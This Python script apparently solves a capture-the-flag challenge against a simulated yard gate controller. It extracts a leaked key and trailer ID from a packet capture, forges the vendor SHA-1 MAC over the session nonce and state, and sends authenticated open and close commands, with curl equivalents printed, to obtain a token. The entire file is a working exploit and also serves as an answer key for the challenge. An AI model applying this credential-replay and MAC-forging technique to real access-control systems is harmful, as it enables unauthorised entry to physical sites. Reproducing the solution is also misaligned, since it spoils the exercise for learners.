#!/usr/bin/env python3
"""
Token 1 Solver (Yard Gate Control)

This script:
1. Extracts the leaked key and trailer from a local PCAP.
2. Creates a live session with the Yard Gate service.
3. Requests the challenge nonce.
4. Computes the vendor MAC exactly as the service does.
5. Sends the full LOCKED -> CLOSED -> OPEN -> CLOSED command chain.
6. Retrieves TOKEN1.

Usage:
    python3 uis_token1_solver.py
"""

import argparse
import hashlib
import re
from pathlib import Path

import requests

DEFAULT_BASE = "http://yard_gate.local:8080"
DEFAULT_PCAP = "t1_yard_traffic.pcap"

STATE_LOCKED = "LOCKED"
STATE_CLOSED = "CLOSED"
STATE_OPEN = "OPEN"


def extract_from_pcap(path):
    key = None
    trailer = None

    if not Path(path).exists():
        return None, None

    data = Path(path).read_bytes()

    k = re.search(rb"LEAK:([0-9a-fA-F]{16})", data)
    if k:
        key = k.group(1).decode()

    t = re.search(rb"TRAILER:([A-Z]+-\d{3})", data)
    if t:
        trailer = t.group(1).decode()

    return key, trailer


def mac_hex(key_hex, trailer, nonce, session, state):
    blob = (
        bytes.fromhex(key_hex)
        + trailer.encode()
        + nonce.encode()
        + session.encode()
        + state.encode()
    )
    return hashlib.sha1(blob).hexdigest()


def post_json(session, url, body):
    response = session.post(url, json=body, timeout=10)
    response.raise_for_status()
    return response


def get_json(session, url):
    response = session.get(url, timeout=10)
    response.raise_for_status()
    return response


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--base-url", default=DEFAULT_BASE)
    parser.add_argument("--pcap", default=DEFAULT_PCAP)
    parser.add_argument("--key")
    parser.add_argument("--trailer")
    args = parser.parse_args()

    base = args.base_url.rstrip("/")

    key = args.key
    trailer = args.trailer

    if not key or not trailer:
        pcap_key, pcap_trailer = extract_from_pcap(args.pcap)
        key = key or pcap_key
        trailer = trailer or pcap_trailer

    if not key:
        raise SystemExit("Could not find leaked key. Provide --key or a valid PCAP.")
    if not trailer:
        raise SystemExit("Could not find trailer. Provide --trailer or a valid PCAP.")

    print("\n[+] Using parameters")
    print("key:", key)
    print("trailer:", trailer)

    http = requests.Session()

    print("\n[1] Create session")
    print(f"curl -s -X POST {base}/yard/gate/session")
    r = post_json(http, f"{base}/yard/gate/session", {})
    session_id = r.json()["session"]
    print("session =", session_id)

    print("\n[2] Request challenge nonce")
    print(
        f"""curl -s -X POST {base}/yard/gate/challenge \\
  -H 'Content-Type: application/json' \\
  -d '{{"session":"{session_id}"}}'"""
    )
    r = post_json(http, f"{base}/yard/gate/challenge", {"session": session_id})
    nonce = r.json()["nonce"]
    print("nonce =", nonce)

    steps = [
        (STATE_LOCKED, "CLOSE"),
        (STATE_CLOSED, "OPEN"),
        (STATE_OPEN, "CLOSE"),
    ]

    for idx, (state, label) in enumerate(steps, start=3):
        digest = mac_hex(key, trailer, nonce, session_id, state)
        print(f"\n[{idx}] {label} command using state={state}")
        print(
            f"""curl -s -X POST {base}/yard/gate/command \\
  -H 'Content-Type: application/json' \\
  -d '{{"session":"{session_id}","trailer":"{trailer}","mac":"{digest}"}}'"""
        )
        r = post_json(
            http,
            f"{base}/yard/gate/command",
            {"session": session_id, "trailer": trailer, "mac": digest},
        )
        print("ack =", r.json().get("ack"))

    print("\n[6] Check gate status")
    print(f"curl -s {base}/yard/gate/status | jq")
    r = get_json(http, f"{base}/yard/gate/status")
    print("\nServer response:")
    print(r.text)

    token = r.json().get("token")
    if token:
        print("\nTOKEN1 =", token)
    else:
        raise SystemExit("TOKEN1 was not returned. The closeout sequence did not complete.")


if __name__ == "__main__":
    main()